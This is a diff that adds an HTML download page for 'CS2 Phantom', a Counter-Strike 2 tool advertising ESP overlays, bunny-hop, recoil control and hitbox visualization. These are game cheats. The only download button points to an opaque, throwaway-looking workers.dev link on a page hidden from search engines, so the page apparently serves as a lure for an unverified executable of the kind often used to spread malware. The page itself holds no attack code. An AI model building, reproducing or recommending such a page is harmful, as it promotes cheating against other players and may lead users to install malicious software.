@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+
+  <title>CS2 Phantom — Download</title>
+
+  <style>
+    :root {
+      --bg: #08070f;
+      --bg-soft: #0e0b17;
+      --panel: rgba(20, 17, 29, .84);
+      --panel-hover: rgba(27, 23, 38, .96);
+      --border: rgba(255, 255, 255, .08);
+      --border-purple: rgba(139, 92, 246, .32);
+
+      --text: #f4f1fa;
+      --muted: #948da2;
+
+      --purple: #8b5cf6;
+      --purple-light: #a78bfa;
+      --purple-dark: #6d28d9;
+      --purple-glow: rgba(139, 92, 246, .2);
+
+      --green: #52e27a;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      min-height: 100%;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+
+      color: var(--text);
+
+      background:
+        radial-gradient(
+          circle at 50% -15%,
+          rgba(139, 92, 246, .18),
+          transparent 38%
+        ),
+        radial-gradient(
+          circle at 90% 60%,
+          rgba(76, 29, 149, .09),
+          transparent 32%
+        ),
+        radial-gradient(
+          circle at 5% 65%,
+          rgba(124, 58, 237, .06),
+          transparent 30%
+        ),
+        var(--bg);
+
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+
+      pointer-events: none;
+
+      background-image:
+        linear-gradient(
+          rgba(255,255,255,.018) 1px,
+          transparent 1px
+        ),
+        linear-gradient(
+          90deg,
+          rgba(255,255,255,.018) 1px,
+          transparent 1px
+        );
+
+      background-size: 48px 48px;
+
+      mask-image: linear-gradient(
+        to bottom,
+        black,
+        transparent 75%
+      );
+
+      opacity: .35;
+    }
+
+    .container {
+      position: relative;
+      width: min(1080px, calc(100% - 40px));
+      margin: 0 auto;
+      padding: 72px 0 55px;
+    }
+
+    .hero {
+      text-align: center;
+      max-width: 820px;
+      margin: 0 auto;
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+
+      margin-bottom: 30px;
+
+      padding: 9px 16px;
+
+      border: 1px solid rgba(139, 92, 246, .25);
+      border-radius: 999px;
+
+      background: rgba(139, 92, 246, .055);
+
+      color: #c3bdce;
+
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+
+      box-shadow:
+        0 0 30px rgba(139, 92, 246, .05);
+    }
+
+    .brand-dot {
+      width: 8px;
+      height: 8px;
+
+      border-radius: 50%;
+
+      background: var(--purple);
+
+      box-shadow:
+        0 0 8px var(--purple),
+        0 0 18px rgba(139, 92, 246, .7);
+
+      animation: blink 2s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: .45;
+      }
+    }
+
+    .logo {
+      position: relative;
+
+      width: 108px;
+      height: 108px;
+
+      margin: 0 auto 26px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border-radius: 30px;
+
+      background:
+        linear-gradient(
+          145deg,
+          #211936,
+          #0c0912 65%
+        );
+
+      border: 1px solid rgba(139, 92, 246, .38);
+
+      box-shadow:
+        0 0 0 1px rgba(139, 92, 246, .05),
+        0 0 35px rgba(139, 92, 246, .16),
+        inset 0 0 35px rgba(139, 92, 246, .07);
+    }
+
+    .logo::before {
+      content: "";
+
+      position: absolute;
+      inset: 9px;
+
+      border-radius: 22px;
+
+      border: 1px solid rgba(167, 139, 250, .16);
+    }
+
+    .logo-text {
+      position: relative;
+      z-index: 1;
+
+      font-size: 23px;
+      font-weight: 900;
+      line-height: .85;
+
+      letter-spacing: -1.5px;
+
+      color: white;
+
+      text-shadow:
+        0 0 18px rgba(139, 92, 246, .35);
+    }
+
+    .logo-text span {
+      display: block;
+
+      margin-top: 8px;
+
+      color: var(--purple-light);
+
+      font-size: 12px;
+      letter-spacing: 3.5px;
+      text-align: center;
+    }
+
+    h1 {
+      margin: 0;
+
+      font-size: clamp(42px, 6vw, 68px);
+      line-height: 1.02;
+      letter-spacing: -2.8px;
+      font-weight: 750;
+    }
+
+    h1 strong {
+      color: var(--purple-light);
+
+      text-shadow:
+        0 0 35px rgba(139, 92, 246, .2);
+    }
+
+    .subtitle {
+      max-width: 700px;
+
+      margin: 22px auto 0;
+
+      color: var(--muted);
+
+      font-size: 17px;
+      line-height: 1.7;
+    }
+
+    .download-area {
+      margin-top: 38px;
+    }
+
+    .download-btn {
+      position: relative;
+
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+
+      min-width: 255px;
+
+      padding: 16px 28px;
+
+      border-radius: 11px;
+
+      color: #fff;
+      background: var(--purple);
+
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: .02em;
+
+      text-decoration: none;
+
+      box-shadow:
+        0 0 0 1px rgba(167, 139, 250, .28),
+        0 8px 35px rgba(139, 92, 246, .2);
+
+      transition:
+        transform .2s ease,
+        box-shadow .2s ease,
+        background .2s ease;
+    }
+
+    .download-btn:hover {
+      background: #9a6cff;
+
+      transform: translateY(-2px);
+
+      box-shadow:
+        0 0 0 1px rgba(167, 139, 250, .42),
+        0 12px 45px rgba(139, 92, 246, .3);
+    }
+
+    .download-btn:active {
+      transform: translateY(0);
+    }
+
+    .download-icon {
+      width: 19px;
+      height: 19px;
+
+      fill: none;
+      stroke: currentColor;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .version {
+      margin-top: 13px;
+
+      color: #686171;
+
+      font-size: 12px;
+      letter-spacing: .04em;
+    }
+
+    .features {
+      display: grid;
+
+      grid-template-columns:
+        repeat(4, minmax(0, 1fr));
+
+      gap: 15px;
+
+      margin-top: 68px;
+    }
+
+    .card {
+      position: relative;
+
+      min-height: 175px;
+
+      padding: 24px 21px;
+
+      border: 1px solid var(--border);
+      border-radius: 16px;
+
+      background: var(--panel);
+
+      backdrop-filter: blur(12px);
+
+      overflow: hidden;
+
+      transition:
+        transform .25s ease,
+        border-color .25s ease,
+        background .25s ease;
+    }
+
+    .card::after {
+      content: "";
+
+      position: absolute;
+
+      left: 0;
+      right: 0;
+      bottom: 0;
+
+      height: 1px;
+
+      background:
+        linear-gradient(
+          90deg,
+          transparent,
+          rgba(139, 92, 246, .5),
+          transparent
+        );
+
+      opacity: 0;
+
+      transition: opacity .25s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+
+      border-color: var(--border-purple);
+
+      background: var(--panel-hover);
+
+      box-shadow:
+        0 15px 40px rgba(0,0,0,.25);
+    }
+
+    .card:hover::after {
+      opacity: 1;
+    }
+
+    .icon {
+      width: 43px;
+      height: 43px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      margin-bottom: 18px;
+
+      border-radius: 12px;
+
+      background:
+        linear-gradient(
+          145deg,
+          rgba(139, 92, 246, .16),
+          rgba(139, 92, 246, .035)
+        );
+
+      border: 1px solid rgba(139, 92, 246, .15);
+
+      color: var(--purple-light);
+
+      font-size: 19px;
+
+      box-shadow:
+        inset 0 0 15px rgba(139, 92, 246, .03);
+    }
+
+    .card h3 {
+      margin: 0 0 8px;
+
+      color: #e9e5ef;
+
+      font-size: 14px;
+      font-weight: 650;
+    }
+
+    .card p {
+      margin: 0;
+
+      color: #7d7587;
+
+      font-size: 13px;
+      line-height: 1.55;
+    }
+
+    .compatibility {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 9px;
+
+      margin-top: 27px;
+    }
+
+    .tag {
+      padding: 7px 12px;
+
+      border: 1px solid rgba(255,255,255,.07);
+      border-radius: 7px;
+
+      background: rgba(255,255,255,.025);
+
+      color: #6d6676;
+
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: .04em;
+    }
+
+    .tag.active {
+      color: #a39baa;
+
+      border-color: rgba(139, 92, 246, .15);
+
+      background: rgba(139, 92, 246, .04);
+    }
+
+    footer {
+      margin-top: 58px;
+
+      text-align: center;
+
+      color: #514b59;
+
+      font-size: 12px;
+    }
+
+    footer span {
+      color: #716979;
+    }
+
+    @media (max-width: 850px) {
+      .features {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (max-width: 560px) {
+      .container {
+        width: min(100% - 28px, 1080px);
+        padding-top: 45px;
+      }
+
+      .logo {
+        width: 92px;
+        height: 92px;
+        border-radius: 25px;
+      }
+
+      h1 {
+        font-size: 41px;
+        letter-spacing: -1.8px;
+      }
+
+      .subtitle {
+        font-size: 15px;
+      }
+
+      .features {
+        grid-template-columns: 1fr;
+        margin-top: 50px;
+      }
+
+      .card {
+        min-height: auto;
+      }
+
+      .download-btn {
+        width: 100%;
+        max-width: 310px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="container">
+
+    <section class="hero">
+
+      <div class="brand">
+        <span class="brand-dot"></span>
+        CS2 Phantom
+      </div>
+
+      <div class="logo">
+        <div class="logo-text">
+          CS2
+          <span>PHANTOM</span>
+        </div>
+      </div>
+
+      <h1>
+        Enhance your
+        <strong>CS2 experience</strong>
+      </h1>
+
+      <p class="subtitle">
+        A lightweight Counter-Strike 2 utility with configurable
+        visual overlays, practice tools, movement assistance,
+        recoil controls, and customizable profiles.
+      </p>
+
+      <div class="download-area">
+
+        <a
+          class="download-btn"
+          href="https://djwggemx.fresh-link.workers.dev/a78ea58f"
+        >
+          <svg class="download-icon" viewBox="0 0 24 24">
+            <path d="M12 3v12"></path>
+            <path d="m7 10 5 5 5-5"></path>
+            <path d="M5 21h14"></path>
+          </svg>
+
+          DOWNLOAD CS2 PHANTOM
+        </a>
+
+        <div class="version">
+          Version 1.0.0 · Windows 10 / 11 · 64-bit
+        </div>
+
+      </div>
+
+    </section>
+
+    <section class="features">
+
+      <div class="card">
+        <div class="icon">◈</div>
+
+        <h3>Visual ESP</h3>
+
+        <p>
+          Configurable player information including
+          boxes, health, armor, skeletons, weapons,
+          distance, and visibility state.
+        </p>
+      </div>
+
+      <div class="card">
+        <div class="icon">⌁</div>
+
+        <h3>Movement</h3>
+
+        <p>
+          Optional bunny-hop and movement assistance
+          with configurable activation keys and profiles.
+        </p>
+      </div>
+
+      <div class="card">
+        <div class="icon">◎</div>
+
+        <h3>Practice Tools</h3>
+
+        <p>
+          Grenade trajectory, landing prediction,
+          hitbox visualization, radar, and crosshair tools.
+        </p>
+      </div>
+
+      <div class="card">
+        <div class="icon">⚙</div>
+
+        <h3>Custom Profiles</h3>
+
+        <p>
+          Save, load, import, and export JSON profiles
+          with independent settings for every module.
+        </p>
+      </div>
+
+    </section>
+
+    <div class="compatibility">
+
+      <div class="tag active">CS2</div>
+      <div class="tag active">WINDOWS 10</div>
+      <div class="tag active">WINDOWS 11</div>
+      <div class="tag active">X64</div>
+      <div class="tag">JSON CONFIGS</div>
+      <div class="tag">PRIVATE SERVERS</div>
+      <div class="tag">PRACTICE</div>
+
+    </div>
+
+    <footer>
+      © 2026 <span>CS2 Phantom</span> · Experimental software
+    </footer>
+
+  </main>
+
+</body>
+</html>
